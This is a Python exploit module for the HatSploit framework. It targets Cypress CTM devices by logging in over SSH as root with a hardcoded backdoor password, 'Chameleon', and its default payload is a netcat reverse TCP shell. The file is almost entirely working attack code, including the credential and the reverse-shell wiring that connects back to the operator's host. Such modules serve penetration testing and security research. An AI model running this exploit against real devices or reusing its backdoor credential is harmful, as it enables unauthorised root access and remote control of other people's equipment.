"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from pex.proto.ssh import SSHClient


class HatSploitModule(Module, SSHClient, Handler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Cypress CTM SSH backdoor password",
            'Module': "exploit/linux/cypress/ctm_backdoor_password",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Remote code execution through SSH backdoor in Cypress CTM devices.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.payload = {
            'Value': "unix/generic/netcat_reverse_tcp",
            'Architectures': ['armle', 'aarch64', 'generic'],
            'Platforms': ['linux', 'unix'],
            'Types': None,
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 22,
                'Type': "port",
                'Required': True,
            },
            'USERNAME': {
                'Description': "SSH username.",
                'Value': "root",
                'Type': None,
                'Required': True,
            },
        }

    def run(self):
        remote_host, remote_port, username = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        client = self.open_ssh(remote_host, remote_port, username, 'Chameleon')

        client.connect()

        self.module_handle(self, host=remote_host, sender=client.send_command)

        client.disconnect()
